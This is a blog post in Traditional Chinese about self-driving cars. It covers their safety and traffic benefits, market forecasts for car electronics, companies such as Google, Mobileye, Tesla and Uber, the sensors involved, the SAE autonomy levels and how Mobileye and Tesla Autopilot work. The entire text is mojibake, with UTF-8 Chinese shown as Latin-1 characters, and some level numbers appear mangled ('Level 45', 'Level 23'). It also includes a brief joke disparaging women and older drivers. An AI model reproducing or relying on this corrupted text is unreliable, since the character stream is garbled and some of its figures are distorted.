è‡ªé§•è»Šå¯ä»¥æ•‘å¤§å®¶çš„å‘½ä»¥ä¸‹é€™äº›ä¸è‰¯çš„é§•é§›è¡Œç‚ºé€ æˆçš„è»Šç¦å‚·äº¡å°‡åœ¨è‡ªé§•è»Šæ™®åŠå¾Œæ¶ˆå¤±ï¼Œåƒæ˜¯ æŠ€è¡“ä¸å¥½çš„äººï¼šåˆå­¸è€…ã€åæ‡‰è¼ƒæ…¢çš„è€äººã€å¥³â€¦ï¼ˆ Mymy å·²è¢« WomanTalk æ¿éš”ç©ºæ°´æ¡¶ ï¼‰ï¼Œæˆ–æ˜¯ åˆ†å¿ƒçš„é§•é§›è¡Œç‚ºï¼šç©æ‰‹æ©Ÿã€æ‰“å™´åšã€é…’é§•ç­‰ã€‚ç¸½ä¹‹ä¸‹é¢æ¥µåº¦æ”¿æ²»ä¸æ­£ç¢ºçš„åœ–ç‰‡ä»¥å¾Œå¯èƒ½ç„¡æ³•åœ¨ PTT è»Šç¦æ–‡ç« ä¸­çš„æ¨æ–‡è¦‹åˆ°äº†ã€‚
![è»Šç¦ä¸‰å¯¶é£¯](/img/mymykuo/three-treasure.jpg)ï¼ˆ Photo Credit: [ä¸‰å¯¶é£¯][3] ï¼‰

äº‹å¯¦ä¸Šï¼ŒGoogle å‰µè¾¦äººæ–½å¯†ç‰¹å°±æ›¾ç¶“èªªäººå€‘æ ¹æœ¬å°±ä¸è©²é–‹è»Šï¼Œé›»è…¦æ‡‰è©²æ¯”è»Šå­æ›´æ—©ç™¼æ˜ã€‚ç•¶ç„¶ï¼Œä»¥ Google ç ”ç™¼å¤šå¹´è‡ªé§•è»Šçš„ç«‹å ´ä¾†èªªï¼Œé€™æ®µè¨€è«–æ˜¯å†æ­£ç¢ºä¸éäº†ã€‚
![Quote by Schmidt](/img/mymykuo/quote-by-schmidt.jpg)ï¼ˆ Photo Credit: [AZQuotes][2] ï¼‰

è‡ªé§•è»Šå¯ä»¥ç¯€çœå¤§å®¶çš„æ™‚é–“å¦‚ä½•çœæ™‚å‘¢ï¼Ÿ

æ¸›å°‘å¡è»Š
åˆ©ç”¨é–‹è»Šæ™‚é–“

å¦‚ä½•æ¸›å°‘å¡è»Šå‘¢ï¼Ÿè‡ªé§•è»Šæ¸›å°‘è»Šç¦å¿…ç„¶èƒ½æ¸›å°‘å¡è»Šï¼Œä½†æ›´å¤šçš„å¡è»Šæ˜¯å› ç‚ºé§•é§›ç…è»Šæ™‚ç”¢ç”Ÿçš„è¡æ“Šæ³¢é€ æˆçš„ã€‚çœ‹ä¸‹é¢é€™æ®µå½±ç‰‡å°±å¯ä»¥äº†è§£å¤§æ¦‚çš„åŸç†ã€‚é€™å¯¦é©—æœ¬ä¾†æ˜¯å¸Œæœ›å¤§å®¶åœ¨åœ“åœˆè£¡ç­‰é€Ÿåœ°é–‹è»Šï¼Œä½†åªè¦æœ‰ä¸€å€‹äººï¼ˆ ä¸€é¡†é¼ å± ï¼‰è¸©äº†ä¸å¿…è¦çš„ç…è»Šï¼Œåœ“åœˆå°±é–‹å§‹å¡è»Šäº†ã€‚


è©³ç´°çš„ç†è«–æˆ‘ä¸å¤šåšä»‹ç´¹äº†ï¼Œæœ‰èˆˆè¶£çš„å¯ä»¥çœ‹ä¸‹é¢çš„å…©ç¯‡æ–‡ç« ï¼š

å¡è»Šï¼šçœ‹ä¸è¦‹çš„æ™‚é–“å°å·
æˆ‘å€‘èƒ½å¦æœçµ•ã€Œå¡è»Šå¹½éˆã€ï¼Ÿ

æƒ³åƒä¸€ä¸‹åœ¨æœªä¾†è»Šè¯ç¶²çš„æ™‚ä»£ï¼Œæ¯ä¸€è¼›æ±½è»Šéƒ½çŸ¥é“å‘¨åœæœ‰å“ªäº›è»Šè¼›å’Œé€™äº›è»Šè¼›çš„è»Šé€Ÿï¼Œç•¶é§•é§›çŸ¥é“å‰æ–¹é è™•çš„è»Šè¼›æ¸›é€Ÿæ™‚ï¼Œå°±å¯ä»¥é€éè‡ªå‹•é§•é§›æ”¾é¬†æ²¹é–€æ…¢æ…¢æ¸›é€Ÿï¼Œæ¸›å°‘è¡æ“Šæ³¢çš„å‚³éä¾†é¿å…å¡è»Šã€‚
å¦‚ä½•åˆ©ç”¨é–‹è»Šæ™‚é–“å‘¢ï¼ŸåŸºæœ¬ä¸Šä»¥å¾Œä¸ç”¨é–‹è»Šäº†ï¼Œé§•é§›çš„é€™æ®µæ™‚é–“ä½ éƒ½èƒ½å¥½å¥½åˆ©ç”¨ï¼Œé‚„ä¿æœ‰éš±ç§å‘¢ï¼åªè¦å¥½å¥½ç™¼æ®äººå€‘æ‡¶æƒ°çš„å¤©æ€§å’Œæƒ…æ…¾æµå‹•çš„æœ¬èƒ½ï¼Œæƒ³åƒåŠ›å°±æœƒæ˜¯ä½ çš„è¶…èƒ½åŠ›ã€‚å¦‚ä¸‹ç¤ºæ„åœ–ã€‚
![ä¸Šç­ç¡éé ­ è»Šä¸Šåˆ·ç‰™](/img/mymykuo/brush-teeth-in-car.jpg)ï¼ˆ ä¸Šç­ç¡éé ­ - Photo Credit: [Her Campus Media][6] ï¼‰

![æˆ‘å€†æƒºæƒºç›¸æƒœ](/img/mymykuo/love-each-other-in-car.png)ï¼ˆ æˆ‘å€†æƒºæƒºç›¸æƒœ - Photo Credit: [å£¹é€±åˆŠ][7] ï¼‰

è‡ªé§•è»Šå¯ä»¥è³ºå¥½å¤šå¥½å¤šéŒ¢ç‚ºä»€éº¼å¯ä»¥è³ºå¥½å¤šéŒ¢å‘¢ï¼Ÿåœ¨ 2012 å¹´æ™‚ï¼Œå› ç‚ºé§•é§›è¼”åŠ©çš„è£ç½®é–‹å§‹å—åˆ°å„åœ‹æ³•å¾‹çš„é‡è¦–ï¼Œåƒæ˜¯è¡Œè»Šç´€éŒ„å™¨ã€èƒå£“åµæ¸¬æˆ–æ˜¯é˜²æ’åµæ¸¬çš„è¨­å‚™ï¼ŒIC ç”¢æ¥­çš„åˆ†æå…¬å¸ IC Market å°±é æ¸¬è»Šç”¨é›»å­ï¼ˆ Auto ï¼‰æœƒæ˜¯é€šè¨Šé›»å­ï¼ˆ Comm ï¼‰å¾Œæˆé•·ç‡ç¬¬äºŒé«˜çš„ç”¢æ¥­ã€‚å¦‚ä¸‹åœ–ã€‚é€™äº›é§•é§›è¼”åŠ©çš„è»Šç”¨é›»å­å³æ˜¯è‡ªé§•è»Šç™¼å±•çš„é‡è¦åŸºç¤è¨­å‚™ã€‚
![IC Market 2011-2016 CAGR](/img/mymykuo/ic-market-2011-2016.jpg)ï¼ˆ Photo Credit: [IC Market][8] ï¼‰

å¦‚ä»Šåˆ°äº† 2016 å¹´ï¼ŒIC Market é ä¼°çš„è»Šç”¨é›»å­æˆé•·ç‡ï¼ˆ 10.3% ï¼‰å·²ç¶“è¶…è¶Šé€šè¨Šé›»å­æˆé•·ç‡ï¼ˆ 4.8% ï¼‰äº†ï¼Œåƒ…æ¬¡æ–¼ IoT æˆé•·ç‡ï¼ˆ 13.3% ï¼‰ã€‚æ˜¯çš„ï¼Œæ²’éŒ¯ï¼ç›®å‰æ‰‹æ©Ÿå¸‚å ´å·²ç¶“é–‹å§‹é£½å’Œäº†ï¼Œæ‰€ä»¥ç¾åœ¨å¾ˆå¤šå…¬å¸éƒ½è½‰å¾€é–‹ç™¼è»Šç”¨é›»å­çš„å¸‚å ´ï¼Œä¸€äº›è»Šç”¨é›»å­ç›¸é—œçš„è‚¡ç¥¨éƒ½æ¼²ä¸åœã€‚
![IC Market 2015-2020 CAGR](/img/mymykuo/ic-market-2015-2020.png)ï¼ˆ Photo Credit: [IC Market][9] ï¼‰

ç°¡å–®ä¾†èªªï¼šæ‰‹æ©Ÿå’Œ PC å¸‚å ´å·²é£½å’Œï¼Œå¿«æ²’æé ­äº† -&gt; è¨±å¤šå…¬å¸å€‘çš„æœªä¾†å¿…é ˆé è»Šç”¨é›»å­äº† -&gt; è‡ªé§•è»Šå‰›å¥½æ˜¯å€‹èƒ½é›†è»Šç”¨é›»å­æ–¼å¤§æˆçš„é…·ç‚«å¥½é¡Œç›®å‘¢ï¼
å› æ­¤å„å®¶å» å•†å¾è»Šç”¨é›»å­çš„è»Ÿé«”ç«¯åˆ°ç¡¬é«”ç«¯ï¼Œä¸è«–è»Ÿé«”å» ã€ç³»çµ±å» ã€æ™¶ç‰‡å» ã€è»Šå» ï¼Œéƒ½é–‹å§‹ç©æ¥µæŠ•å…¥è³‡æºé–‹ç™¼è‡ªé§•è»Šï¼Œå› ç‚ºçœŸçš„å¯ä»¥è³ºå¥½å¤šå¥½å¤šéŒ¢ã€‚ä¸‹åœ–åˆ—å‡ºå¹¾å®¶ä»£è¡¨æ€§çš„å» å•†ã€‚
![33 Corporations](/img/mymykuo/33-self-driving-corporations.png)ï¼ˆ Photo Credit: [CB Insights][10] ï¼‰

ç°¡å–®èˆ‰ä¾‹ä¸€ä¸‹å…¶ä¸­ä»£è¡¨æ€§çš„å¹¾å®¶è¿‘æœŸåšäº†å•¥ï¼š

Apple - 2014 å¹´å°±é–‹å§‹åç‚º Taitan çš„è‡ªé§•è»Šè¨ˆç•«ï¼Œå› ç™¼å±•æ–¹å‘ä¸€ç›´ä¸å¤§æ˜ç¢ºï¼Œåœ˜éšŠæˆå“¡ç›¸ç¹¼å‡ºèµ°ã€‚æœ€è¿‘æ“šå‚³åœ¨ç‘å£«ç¥•å¯†å¯¦é©—å®¤æ‹›è˜ç ”ç©¶å“¡ï¼Œä½èª¿é–‹ç™¼è‡ªå‹•é§•é§›æŠ€è¡“ã€‚

Audiã€BMWã€Daimler - 2015 å¹´è¯æ‰‹è²·ä¸‹ HERE Mapï¼Œç‚ºç ”ç™¼è‡ªå‹•é§•é§›æŠ€è¡“é‹ªè·¯ã€‚

Google - æœ€æ—©é–‹å§‹ï¼Œä¹Ÿæ˜¯ç›®å‰æŠ€è¡“æœ€é ˜å…ˆçš„ã€‚ä½†éš¨è‘—ç«¶çˆ­å°æ‰‹è®Šå¤šã€é²é²æœªå•†æ¥­åŒ–ã€CTO Chris Urmson é›¢è·ï¼Œè®“å¤–ç•Œé–‹å§‹æœ‰ Google å°‡åœ¨è‡ªå‹•é§•é§›è»Šé ˜åŸŸè½å¾Œçš„è²éŸ³ï¼Œä¸é Google é¦¬ä¸Šç”¨é™ä½ Lidar æˆæœ¬çš„é—œéµçªç ´æ‰“è‡‰å„æ–¹çš„è³ªç–‘ã€‚

Mobileye - é€éå½±åƒè¾¨è­˜é–‹ç™¼é˜²æ’ç³»çµ±èåçš„å…¬å¸ï¼Œç›®å‰å„è»Šå» çš„ ADASï¼ˆ Advanced Driver Assistance Systems ï¼‰å¹¾ä¹éƒ½æ˜¯è·Ÿå®ƒåˆä½œã€‚2016 å¹´èˆ‡ Intelã€BMW çµç›Ÿé–‹ç™¼è‡ªé§•è»Šï¼Œ2017 å¹´å°±è¢« Intel æ”¶è³¼äº†ã€‚

Nvidia - å› ç‚ºè‡ªå‹•é§•é§›çš„æŠ€è¡“éœ€è¦é«˜é€Ÿé‹ç®—ï¼Œæ‰€ä»¥ä»¥ GPU é«˜é€Ÿé‹ç®—èåçš„ Nvidia ä¹Ÿä¾†åˆ†ä¸€æ¯ç¾¹ã€‚åœ¨ 2016 å¹´çš„ CES å±•æ¨å‡ºäº†çµ¦è‡ªé§•è»Šè£è¼‰çš„è¶…ç´šé›»è…¦ï¼Œç”¨ GPU åŠ é€Ÿ Deep Learning çš„é‹ç®—ï¼ˆ ç›®å‰è¨±å¤šè‡ªé§•ç›¸é—œçš„æŠ€è¡“éƒ½ç”¨åˆ° Deep Learning ï¼‰ã€‚2016 å¹´åº•ï¼ŒTesla æ¨å‡ºçš„è»Šæ¬¾å°±æ˜¯ä½¿ç”¨æ­¤ç¡¬é«”æ¶æ§‹ã€‚

Tesla - 2016 å¹´ 7 æœˆæ™‚çµæŸäº†èˆ‡ Mobileye åˆä½œé–‹ç™¼è‡ªé§•è»Šçš„é—œä¿‚ã€‚åŒå¹´ 10 æœˆè½‰å‘èˆ‡ Nvidia åˆä½œã€‚

Uber - æœ¬ä¾†ä¹Ÿæƒ³è²· Here Map çš„ï¼Œä½†æ•µä¸éè»Šå» å€‘çš„åˆä½œã€‚è¿‘æœŸåœ¨äºåˆ©æ¡‘é‚£å·çš„è‡ªé§•è»Šç™¼ç”Ÿè»Šç¦ï¼ŒåŠ ä¸Šè¢«æ§ç›œå– Waymo è‡ªé§•è»ŠæŠ€è¡“ï¼Œå‰æ™¯å ªæ†‚ã€‚


å¾ 2016ã€2017 å¹´çš„æ¶ˆè²»é›»å­å±•ï¼ˆ Consumer Electronics Showï¼ŒCES ï¼‰ï¼Œå°±å¯ä»¥çœ‹å‡ºå„å®¶å» å•†å°æ–¼è‡ªé§•è»Šå¸‚å ´æœ‰å¤šéº¼çœ‹é‡ã€‚æœ‰èˆˆè¶£å¯ä»¥åƒè€ƒä¸‹é¢å¹¾å‰‡æ–°èï¼š

2016 CES å±•å…¨çƒè»Šå» ç²¾éŠ³ç›¡å‡ºï¼Œç„¡äººé§•é§›èˆ‡æ–°èƒ½æºè»Šç‚ºæœ€å¤§è¶¨å‹¢
CES 2017 æ“˜åŠƒå¾Œè‡ªé§•è»Šæ™‚ä»£è—åœ–ï¼Œç™¼å±•é—œéµåœ¨æ³•è¦è€ŒéæŠ€è¡“
2017 å¹´ CES äº”å¤§ä¸»æµï¼šVRã€è‡ªé§•è»Šã€ç©¿æˆ´è£ç½®ã€AIã€IoT
CES 2017è‡ªå‹•é§•é§›è»Šèµ·é£›ï¼Œå°ç£è»Šè¯ç¶²çš„æ©Ÿæœƒåœ¨å“ªè£¡ï¼Ÿ
Hereâ€™s why self-driving cars took center stage at CES

[ ä»€éº¼æ˜¯è‡ªé§•è»Š ]è¬›å®Œè‡ªé§•è»Šé‡è¦çš„åŸå› å¾Œï¼Œä¾†è«‡è«‡åˆ°åº•ä»€éº¼æ˜¯è‡ªé§•è»Šå§ã€‚å…ˆä¾†çœ‹çœ‹ Wikipedia å°è‡ªé§•è»Šçš„å®šç¾©ã€‚

â€œAn autonomous car ( driverless car, self-driving car, robotic car ) is a vehicle that is capable of sensing its environment and navigating without human input.â€ â€“ Wikipedia

è’Ÿç¯›ä¸€ä¸‹ï¼šè‡ªé§•è»Šã€ç„¡äººè»Šã€æˆ–æ˜¯æ©Ÿå™¨è»Šï¼Œæ˜¯ä¸€ç¨®å¯ä»¥ æ„ŸçŸ¥ç’°å¢ƒ å’Œ é§•é§›æ™‚ä¸éœ€äººé¡æ“ä½œ çš„è»Šè¼›ã€‚
è‡ªé§•è»Šå¦‚ä½•æ„ŸçŸ¥ç’°å¢ƒä¸»è¦æ˜¯ç”¨ä»¥ä¸‹çš„é›»å­è¨­å‚™ï¼š

Radar - ç”¨ Radio ä¾†é‡æ¸¬ç‰©é«”æ–¹ä½ã€è·é›¢å’Œé€Ÿåº¦ã€‚ä¸»è¦æ‹¿ä¾†é˜²æ’ã€‚

Lidar - Radar æ˜¯ç”¨ Radioï¼ŒLidar æ˜¯ç”¨ Laserï¼Œå¯ä»¥æ›´ç²¾æº–ä¸”ç¯„åœæ›´å»£ï¼ˆ å¤§æ¦‚ 100 å…¬å°º ï¼‰çš„æ¸¬é‡ç‰©é«”çš„æ–¹ä½ã€è§’åº¦ã€è·é›¢ã€‚ä¸»è¦æ‹¿ä¾†å»ºè¶…ç²¾ç´°çš„ 3D Mapã€‚

Camera -  è² è²¬é›»è…¦è¦–è¦ºè™•ç†ï¼Œè¾¨è­˜è¡Œäººã€äº¤é€šè™ŸèªŒã€ç‰©é«”è·é›¢ã€é“è·¯ç™½ç·šã€‚

Ultrasonic Sensor -  ç”¨è²æ³¢é‡æ¸¬ç‰©é«”æ–¹ä½ã€è·é›¢å’Œé€Ÿåº¦ï¼Œæ‹¿ä¾†é˜²æ’å’Œåµæ¸¬åœè»Šç©ºé–“ã€‚

GPS - ç”¨ä¾†å®šä½ï¼Œç¼ºé»æ˜¯æœ‰èª¤å·®ã€‚


è‡ªå‹•é§•é§›æ™‚ä¸éœ€ä»€éº¼äººç‚ºæ“ä½œè‡ªé§•æ™‚æœ‰ä¸‰å€‹é …ç›®å¯ä»¥ä¸éœ€è¦äººç‚ºæ“ä½œï¼š

åŠ é€Ÿ
ç…è»Š
æ–¹å‘ç›¤

ä¸éœ€æ“ä½œçš„é …ç›®æ„ˆå¤šï¼Œäººç‚ºçš„ä»‹å…¥æ„ˆå°‘ï¼Œä»£è¡¨è‡ªé§•è»Šçš„ç­‰ç´šæ„ˆé«˜ã€‚ä»¥ä¸‹æœƒè©³ç´°ä»‹ç´¹æ€éº¼å°‡è‡ªé§•è»Šä½œç­‰ç´šåˆ†é¡ã€‚
SAE è‡ªé§•è»Šç­‰ç´šåˆ†é¡è¡¨SAEï¼ˆ Society of Automotive Engineers ï¼‰International ç¾åœ‹æ±½è»Šå·¥ç¨‹å¸«å”æœƒé‡å°ä¸åŒè‡ªå‹•é§•é§›çš„ç¨‹åº¦ï¼Œåˆ†æˆ 0~5 çš„ç­‰ç´šï¼Œç­‰ç´šæ„ˆé«˜è‡ªé§•çš„ç¨‹åº¦æ„ˆé«˜ï¼Œä½†ä¹Ÿæ„ˆé›£é”æˆã€‚å¦‚ä¸‹åœ–ã€‚
![SAE Self-Driving Car Levels](/img/mymykuo/sae-self-driving-car-levels.png)ï¼ˆ Photo Credit: [SAE International][28] ï¼‰

äº‹å¯¦ä¸Šä¸Šé¢é€™å¼µåœ–å·²ç¶“è¶…è©³ç´°äº†ï¼ˆ å­—å¤ªå¤šåˆè‹±æ–‡å¤§å®¶ä¸€å®šæ‡¶å¾—çœ‹ ï¼‰ï¼Œä½†ç‚ºäº†æ–¹ä¾¿è§£é‡‹æˆ‘ç”¨ç™½è©±æ•´ç†æˆä¸‹è¡¨ã€‚
![SAE Self-Driving Car Levels in Chinese](/img/mymykuo/sae-self-driving-car-levels-in-chinese.png)

ç”±å·¦åˆ°å³æ˜¯ 0~5 çš„è‡ªé§•è»Šç­‰ç´šï¼Œå„å€‹ Level çš„é‡é»å¦‚ä¸‹ï¼š

Level 0ï¼šæ²’æœ‰è‡ªé§•ã€ä½†æœƒè­¦å‘Šã€‚èˆ‰ä¾‹ä¾†èªªï¼Œè£æœ‰ Mobileye çš„è»Šå­ï¼Œè»Šå…§æœƒæœ‰è¢å¹•é¡¯ç¤ºè»Šé“åé›¢è­¦ç¤ºï¼ˆ Lane Departure Warning ï¼‰å’Œå‰æ–¹ç¢°æ’è­¦ç¤ºï¼ˆ Forward Collision Warning ï¼‰ã€‚æ­¤ç¨®è»Šå°±æ˜¯è½åœ¨é€™å€‹ Levelã€‚

Level 1ï¼šåŠ æ¸›é€Ÿã€è½‰å‘ä¸€æ¬¡ä¸€å€‹ã€‚ä¾‹å¦‚ Mobileye é‡æ¸¬åˆ°éšœç¤™ç‰©æ™‚è‡ªå‹•ç…è»Šï¼Œæˆ–æ˜¯é‡æ¸¬åˆ°åé›¢è»Šé“æ™‚å¹«ä½ èª¿æ•´æ–¹å‘ç›¤ã€‚ç¾åœ¨å¾ˆå¤šè·Ÿ Mobileye åˆä½œçš„è»Šå» å°±æ˜¯é€™é¡å‹ã€‚

Level 2ï¼šåŠ æ¸›é€Ÿã€è½‰å‘ä¸€æ¬¡å¤šå€‹ã€‚è‡³å°‘æœ‰å…©é …æ§åˆ¶èƒ½éšèª¿åœ°è‡ªå‹•åŒ–ï¼Œä¾‹å¦‚ä¸€é‚Šè·Ÿå‰è»Šä¿æŒç­‰é€Ÿï¼Œåˆä¸€é‚Šç¶­æŒåœ¨è»Šé“å…§ã€‚

Level 3ï¼š ä¸€äº›æƒ…å¢ƒä¸‹ï¼Œå¯ä»¥å®Œå…¨ä¸ç”¨äººç‚ºæ“ä½œï¼Œä¾‹å¦‚é«˜é€Ÿå…¬è·¯ã€‚ä¸éç¾åœ¨æ­è¼‰ Hardware-1 çš„ Tesla åœ¨é«˜é€Ÿå…¬è·¯ä¸Šä½¿ç”¨ Autopilot é§•é§›æ™‚é‚„ä¸èƒ½å…¨ç¨‹æ”¾æ‰‹ï¼ˆ è¦æ”¾æ‰‹ç•¶ç„¶ä¹Ÿæ˜¯å¯ä»¥ï¼Œä½† Tesla æœ‰å…è²¬è²æ˜å‘¦ ï¼‰ï¼Œå¦‚æœèƒ½æ”¾æ‰‹åšè‡ªå·±æƒ³åšçš„äº‹ï¼Œå°±ç¬¦åˆ Level 3ï¼Œç›®å‰å§‘ä¸”ç¨±å®ƒ Level 2.5 å§ã€‚ï¼ˆ äº‹å¯¦ä¸Šåœ¨ 2016 å¹´åº• Tesla è·Ÿ Nvidia åˆä½œæ¨å‡ºäº†æ–°çš„ç¡¬é«”æ¶æ§‹ Hardware-2ï¼Œç›®æ¨™æ˜¯åœ¨ 2017 å¹´åº•æ¨å‡º Level 45 çš„å…¨è‡ªé§•æŠ€è¡“ã€‚ç¤™æ–¼ç‰ˆé¢é…ç½®å’Œå¾Œæ®µè§£èªªæ–¹ä¾¿ï¼Œ~~Tesla æ™šè¼©ä½ å°±å…ˆåœ¨æ­¤æ–‡ç« å¾…åœ¨ Level 23 å¥½å¥½åçœå§ï¼Œæœªä¾†æ˜¯ä½ çš„ï¼~~ ï¼‰

Level 4ï¼šé™¤äº†ä¸€äº›ç‰¹æ®Šæƒ…å¢ƒè‡ªé§•è»Šé–‹ä¸äº†ï¼Œä¾‹å¦‚ï¼šå¤§é›¨ã€ä¸‹é›ªã€å¼·å…‰ã€æ²’æœ‰è¶…ç²¾ç´°çš„ Mapï¼ˆ å¾Œé¢æœƒæ ï¼‰çš„åœ°æ–¹ï¼Œæˆ–æ˜¯å¾Œé¢çš„è­¦å¯Ÿå«ä½ åœä¸‹ä¾†ï¼Œå…¶å®ƒç‹€æ³æ­¤ Level çš„è‡ªé§•è»Šéƒ½å¯ä»¥ Carryã€‚

Level 5ï¼šLevel 5 çš„è»Šï¼Œé§•é§›è¦åœ¨è»Šä¸Šåšä»€éº¼éƒ½è¡Œï¼ˆ &gt;&#x2F;&#x2F;&#x2F;&lt; ï¼‰ï¼Œè»Šä¸Šä¹Ÿæ²’æœ‰æ–¹å‘ç›¤ã€‚é€™ä¹Ÿæ˜¯ Google çš„æœ€çµ‚ç›®æ¨™ã€‚


[ è‡ªé§•è»Šæ˜¯å¦‚ä½•é‹ä½œçš„ ]è‡ªé§•è»Šå¤§æ¦‚æ˜¯æ€éº¼é‹ä½œçš„å‘¢ï¼Œä»¥ä¸‹å°‡ç”¨ä¸Šæ®µ Level è¡¨ä¸­æåˆ°çš„å…¬å¸ï¼šMobileyeã€Teslaã€Googleï¼Œå¾ Level 0~5 é€ä¸€ä»‹ç´¹ã€‚
å¾Œè£å¸‚å ´çš„ Mobileye - Level 0![Mobileye Aftermarket](/img/mymykuo/mobileye-aftermarket.png)ï¼ˆ Photo Credit: [Mobileye][29]ã€[Mazda 5][30] ï¼‰

å…ˆå¾è£è¼‰ Mobileye çš„ Level 0 è‡ªé§•è»Šä¾†è§£é‡‹ã€‚è³£å‡ºå»çš„è»Šï¼Œè£ä¸Š Mobileye Sensor - EyeQ  Camera çš„å½±åƒè¾¨è­˜è™•ç†å™¨ï¼Œå†åŠ ä¸Š EyeWatch è­¦å ±å™¨ï¼Œå°±å¯ä»¥å®Œæˆä¸‹åœ–çš„è­¦å ±åŠŸèƒ½ï¼š
![Mobileye Aftermarket Example](/img/mymykuo/mobileye-aftermarket-example.png)ï¼ˆ Photo Credit: [Mobileye][29] ï¼‰


å‰è»Šç¢°æ’è­¦å ± - æé†’é§•é§›è¸©ç…è»Š
è»Šé“åç§»è­¦å ± - æé†’è½‰æ–¹å‘ç›¤
é«˜é€Ÿå…¬è·¯ç›£è¦–è­¦å ±  - æé†’é›¢å‰è»Šéé ï¼Œè©²åŠ é€Ÿäº†

é›–ç„¶æ²’æœ‰è‡ªé§•ï¼Œéœ€è¦äººç‚ºæ“ä½œï¼Œä½†æœ‰è­¦å ±ï¼Œæ‰€ä»¥ç¬¦åˆ Level 0ã€‚
å‰è£å¸‚å ´çš„ Mobileye - Level 1![Mobileye Before Market](/img/mymykuo/mobileye-before-market.png)ï¼ˆ Photo Credit: [Mobileye][29]ã€[Mazda 5][30]ã€[CarPlay][31] ï¼‰

ä»¥ä¸‹ç”¨ Mobileye çš„å‰è£å¸‚å ´ä¾†è§£é‡‹ Level 1ã€‚åœ¨æ±½è»Šå”®å‡ºå‰ï¼Œå°±æœƒå…ˆè£å¥½ Mobileye çš„ Camera ä½œç‚º Sensor æˆ–æ˜¯åˆ¥å®¶å» å•†çš„ Cameraï¼Œè»Šè£ä¸»æ©Ÿå†æ­é… Mobileye çš„å½±åƒè¾¨è­˜åŠŸèƒ½ï¼Œå°±å¯ä»¥åœ¨å½±åƒè¾¨è­˜å‡ºä¸åŒç‹€æ³æ™‚ï¼Œè®“æ±½è»Šè‡ªå‹•åŠ æ¸›é€Ÿæˆ–è½‰æ–¹å‘ç›¤ã€‚å¦‚ä¸‹åœ–ä¸‰ç¨®ç‹€æ³ï¼š
![Mobileye Before Market Example](/img/mymykuo/mobileye-before-market-example.png)ï¼ˆ Photo Credit:  [Mobileye][29] ï¼‰


å‰è»Šç¢°æ’é é˜²ç³»çµ± - å½±åƒè¾¨è­˜å‡ºå¿«æ’åˆ°å‰è»Šäº†ï¼Œæ±½è»Šå°±è‡ªå‹•æ¸›é€Ÿ
è»Šé“ä¿æŒè¼”åŠ©ç³»çµ± - å½±åƒè¾¨è­˜å‡ºå¿«åé›¢è»Šé“äº†ï¼Œæ±½è»Šå°±è‡ªå‹•è½‰æ–¹å‘ç›¤
è»Šè·æ§åˆ¶å·¡èˆªç³»çµ±  - å½±åƒè¾¨è­˜å‡ºé›¢å‰è»Šéé ï¼Œæ±½è»Šå°±è‡ªå‹•åŠ é€Ÿ

ä½†é€™å€‹ç­‰ç´šä¸€æ¬¡åªèƒ½åŸ·è¡Œä¸€å€‹ä»»å‹™ï¼Œæ²’è¾¦æ³•éšæ®µæ€§çš„å®Œæˆå…©å€‹ä»»å‹™ã€‚ä¾‹å¦‚ä¸€é‚Šé–‹åœ¨è»Šé“åˆä¸€é‚Šé–‹å•Ÿå·¡èˆªç³»çµ±ï¼Œé‚£æ˜¯ä¸‹ä¸€å€‹ç­‰ç´š Level 2 åšçš„äº‹ã€‚
Tesla Autopilot - Level 2~3ä¸‹å€‹ç­‰ç´šï¼Œä¹Ÿå°±æ˜¯ Tesla ç›®å‰çš„ç­‰ç´š Level 2.5ï¼ˆ ä¸Šè¿°æœ‰æåˆ°è¦èƒ½åœ¨é«˜é€Ÿå…¬è·¯å®Œå…¨æ”¾æ‰‹æ‰ç®—æ˜¯ Level 3 ï¼‰ã€‚å®ƒçš„è‡ªé§•è¼”åŠ©ç³»çµ±åå­—æ˜¯ Autopilotï¼Œåœ¨ 2016 å¹´åº•å‰æ­è¼‰ Hardware-1 çš„ Autopilot ä¸»è¦æœ‰ä¸‰å€‹åŠŸèƒ½ï¼šAutosteerã€Auto Lane Changeã€Autoparkï¼Œæ¯å€‹åŠŸèƒ½éƒ½å¯ä»¥éšæ®µæ€§çš„å®Œæˆå…©å€‹åŠŸèƒ½ä»¥ä¸Šï¼Œèˆ‰ä¾‹ä¾†èªªï¼š

Autosteer - å¯ä»¥ä¸€é‚Šè·Ÿè»Šï¼Œä¸€é‚Šä¿æŒåœ¨è»Šé“å…§ã€‚éšæ®µæ€§çš„å®Œæˆè»Šè·æ§åˆ¶å·¡èˆªç³»çµ±ï¼ˆ Adaptive Cruise Control ï¼‰ï¼‹ è»Šé“ä¿æŒè¼”åŠ©ç³»çµ±ï¼ˆ Lane Keeping Assist ï¼‰ã€‚

Auto Lane Change - è®“è»Šå­å¯ä»¥è‡ªå‹•æ›é“ï¼Œåˆå¯ä»¥é¿å…æ’åˆ°æ—è»Šã€‚ä½¿ç”¨æ—å´ç¢°æ’é é˜²ç³»çµ±ï¼ˆ Side Collision Avoidance ï¼‰ï¼‹ ç›²é»åµæ¸¬ç³»çµ±ï¼ˆ Blind Spot Detection ï¼‰ã€‚

Autopark - å¯ä»¥è‡ªå‹•åœè»Šã€‚ä½¿ç”¨åœè»Šå€åŸŸåµæ¸¬ç³»çµ±ï¼ˆ Parking Space Detection ï¼‰ï¼‹å‰&#x2F;æ—å´ç¢°æ’é é˜²ç³»çµ±ï¼ˆ Forward&#x2F;Side Collision Avoidance ï¼‰ã€‚


æ­¤æ¬¾ Autopilot çš„é€™äº›åŠŸèƒ½é™¤äº†è‡ªå‹•åœè»Šä»¥å¤–ï¼Œåªèƒ½åœ¨é«˜é€Ÿå…¬è·¯ä¸Šä½¿ç”¨ã€‚èƒ½å¯¦ç¾é€™äº›åŠŸèƒ½é çš„æ˜¯ä»¥ä¸‹é€™äº› Sensorsï¼šRadarã€Cameraã€Ultrasonic Sensorã€‚å¦‚ä¸‹åœ–ã€‚
![Tesla Hardware-1 Sensors](/img/mymykuo/tesla-hardware1-sensors.png)ï¼ˆ Photo Credit: [Tesla][33] ï¼‰

